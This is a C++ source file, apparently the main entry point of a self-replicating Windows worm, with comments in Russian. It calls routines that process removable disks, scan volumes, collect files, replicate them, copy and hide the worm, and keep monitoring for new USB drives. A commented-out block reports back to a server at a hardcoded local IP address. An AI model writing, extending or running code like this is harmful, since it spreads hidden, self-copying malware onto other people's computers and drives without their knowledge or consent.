
#include "DataSend.h"
#include "worm.h"
#include "NetUtils.h"

#pragma comment(lib, "Ws2_32.lib")


int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLine, int nCmdShow)

{
#ifdef _DEBUG
	attach_console();
#endif
	//attach_console(); // удалить

	SetConsoleOutputCP(CP_UTF8);
	SetConsoleCP(CP_UTF8); 

	std::locale loc("ru_RU.UTF-8");  // или std::locale loc("");
	std::wcout.imbue(loc);
	std::wcerr.imbue(loc);

	setlocale(LC_ALL, ".UTF8");


	worm worm1;
	worm::instance = &worm1;


	// часть с работой самого червя
	
	//worm1.worm_was_started();
	worm1.process_all_removable_disks();
	worm1.scan_all_volumes();
	worm1.collect_visible_files();
	worm1.print_list_dir();
	worm1.replicate_files(5);
	worm1.copy_and_hide_worm();
	//worm1.print_file_to_copy();
	
	return worm1.run_device_monitor(hInstance); // запуск мониторинга флешек
	//wcout<<get_own_path();

	/*
	// часть с отправлением сообщений на локальный айпишник 
	DataSend client("10.82.61.198", 12345); // 192.168.0.147 — локальный IP, порт 12345

	// Подключаемся к серверу
	if (client.connectToServer()) {
		std::wcout << L"Соединение установлено!\n";

		// Отправляем данные
		if (client.sendData("Привет, сервер, червь отработал штатно!")) {
			std::wcout << L"Данные успешно отправлены.\n";
		}
		else {
			std::wcout << L"Ошибка при отправке данных.\n";
		}

		// Отключаемся от сервера
		client.disconnect();
	}
	else {
		std::wcout << L"Не удалось подключиться к серверу.\n";
	*/
	//worm1.worm_was_end();
}